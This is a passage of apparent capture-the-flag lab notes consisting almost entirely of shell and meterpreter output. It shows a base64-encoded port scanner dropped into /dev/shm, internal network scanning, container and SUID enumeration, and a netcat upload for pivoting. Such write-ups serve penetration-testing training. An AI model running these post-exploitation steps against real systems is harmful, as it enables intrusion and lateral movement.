172.16.1.243 dev eth1  used 15/75/12 probes 6 FAILED
172.16.1.234 dev eth1  used 19/79/16 probes 6 FAILED
172.16.1.252 dev eth1  used 10/70/7 probes 6 FAILED
172.16.1.247 dev eth1  used 13/73/10 probes 6 FAILED
172.16.1.238 dev eth1  used 17/77/14 probes 6 FAILED
172.16.1.251 dev eth1  used 11/71/8 probes 6 FAILED
172.16.1.242 dev eth1  used 15/75/12 probes 6 FAILED
172.16.1.229 dev eth1  used 22/82/19 probes 6 FAILED
172.16.1.246 dev eth1  used 13/73/10 probes 6 FAILED
172.16.1.233 dev eth1  used 20/80/17 probes 6 FAILED
```


```bash
www-data@app:/dev/shm$ echo 'IyEvdXNyL2Jpbi9weXRob24zDQppbXBvcnQgc29ja2V0DQppbXBvcnQgc2VsZWN0DQpkZWYgc2NhbihpcCk6DQogIHByaW50KCdcbj09ICcgKyBpcCkNCiAgdHJ5Og0KICAgIGZvciBwb3J0IGluIHJhbmdlKDEsNjU1MzUpOiAgDQogICAgICBzb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQ0KICAgICAgc29jay5zZXR0aW1lb3V0KDAuMikNCiAgICAgIHJlc3VsdCA9IHNvY2suY29ubmVjdF9leCgoaXAsIHBvcnQpKQ0KICAgICAgaWYgcmVzdWx0ID09IDA6DQogICAgICAgIHNvY2suc2V0YmxvY2tpbmcoMCkNCiAgICAgICAgcmVhZHkgPSBzZWxlY3Quc2VsZWN0KFtzb2NrXSwgW10sIFtdLCAwLjUpDQogICAgICAgIGlmIHJlYWR5WzBdOg0KICAgICAgICAgIGRhdGEgPSBzb2NrLnJlY3YoNDA5NikNCiAgICAgICAgcHJpbnQoIlBvcnQge306ICAgICAgT3BlblxuICB7fSIuZm9ybWF0KHBvcnQsIGRhdGEpKQ0KICAgICAgICBzb2NrLmNsb3NlKCkNCiAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KICAgIHN5cy5leGl0KCkNCiAgZXhjZXB0IHNvY2tldC5nYWllcnJvcjoNCiAgICBwcmludCgnSG9zdG5hbWUgY291bGQgbm90IGJlIHJlc29sdmVkLicpDQogICAgcmV0dXJuDQogIGV4Y2VwdCBzb2NrZXQuZXJyb3I6DQogICAgcHJpbnQoIkNvdWxkbid0IGNvbm5lY3QgdG8gc2VydmVyLiIpDQogICAgcmV0dXJuDQpzY2FuKCcxNzIuMTYuMS4xMjgnKQ==' | base64 -d > ports.py
<mV0dXJuDQpzY2FuKCcxNzIuMTYuMS4xMjgnKQ==' > ports.py
www-data@app:/dev/shm$ ls
ls
arp.py	ports.py
www-data@app:/dev/shm$ ls
ls
arp.py	ports.py
www-data@app:/dev/shm$ python3 ports.py
python3 ports.py

== 172.16.1.128
Port 21:      Open
  b'220 (vsFTPd 2.3.4)\r\n'
Port 179:      Open
  b''
Port 2601:      Open
...
Port 2605:      Open
...

```

```bash
cat /etc/mtab
...
/dev/xvda1 /etc/resolv.conf ext4 rw,relatime,discard,data=ordered 0 0
/dev/xvda1 /etc/hostname ext4 rw,relatime,discard,data=ordered 0 0
/dev/xvda1 /etc/hosts ext4 rw,relatime,discard,data=ordered 0 0
shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k 0 0
/dev/xvda1 /var/www/flag.txt ext4 rw,relatime,discard,data=ordered 0 0
...
ls -a /
.
..
.dockerenv
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
...
ps -Af
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 Jul20 ?        00:00:00 /bin/bash /sbin/entrypoint.sh
mysql       41     1  0 Jul20 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
mysql      427    41  0 Jul20 ?        00:00:04 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306 --log-syslog=1 --log-syslog-facility=daemon --log-syslog-tag=
root       518     1  0 Jul20 ?        00:00:00 php-fpm: master process (/etc/php/7.2/fpm/php-fpm.conf)
www-data   519   518  0 Jul20 ?        00:00:00 php-fpm: pool www
www-data   520   518  0 Jul20 ?        00:00:00 php-fpm: pool www
root       521     1  0 Jul20 ?        00:00:00 nginx: master process nginx -g daemon off;
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
14: eth0@if15: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
19: eth1@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN group default 
    link/ether 02:42:ac:10:01:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.16.1.10/24 brd 172.16.1.255 scope global eth1
       valid_lft forever preferred_lft forever
       ip route show
default via 172.18.0.1 dev eth0 
172.16.1.0/24 dev eth1 proto kernel scope link src 172.16.1.10 
172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.2 
cat /sbin/entrypoint.sh
#!/bin/bash

chmod 664 /var/www/flag.txt
chown www-data:www-data /var/www/flag.txt

chown -R mysql:mysql /var/lib/mysql /var/run/mysqld
service mysql start
service php7.2-fpm start
#service nginx start
nginx -g "daemon off;"
```


```bash
www-data@app:~/html$ find / -perm -u=s -ls 2>/dev/null
find / -perm -u=s -ls 2>/dev/null
   518230     44 -rwsr-xr-x   1 root     root        44664 Mar 22  2019 /bin/su
   518236     28 -rwsr-xr-x   1 root     root        26696 Aug 22  2019 /bin/umount
   517830     44 -rwsr-xr-x   1 root     root        43088 Aug 22  2019 /bin/mount
   518753     76 -rwsr-xr-x   1 root     root        76496 Mar 22  2019 /usr/bin/chfn
   518845     40 -rwsr-xr-x   1 root     root        40344 Mar 22  2019 /usr/bin/newgrp
   518855     60 -rwsr-xr-x   1 root     root        59640 Mar 22  2019 /usr/bin/passwd
   518755     44 -rwsr-xr-x   1 root     root        44528 Mar 22  2019 /usr/bin/chsh
   518801     76 -rwsr-xr-x   1 root     root        75824 Mar 22  2019 /usr/bin/gpasswd
www-data@app:~/html$ 
```




meterpreter > ps

Process List
============

 PID  Name              User      Path
 ---  ----              ----      ----
 1    /bin/bash         root      /bin/bash /sbin/entrypoint.sh
 41   /bin/sh           mysql     /bin/sh /usr/bin/mysqld_safe


 meterpreter > upload nc.exe
[*] Uploading  : /root/Borderlands/nc.exe -> nc.exe
[*] Uploaded -1.00 B of 27.50 KiB (-0.0%): /root/Borderlands/nc.exe -> nc.exe
[*] Completed  : /root/Borderlands/nc.exe -> nc.exe
meterpreter > 




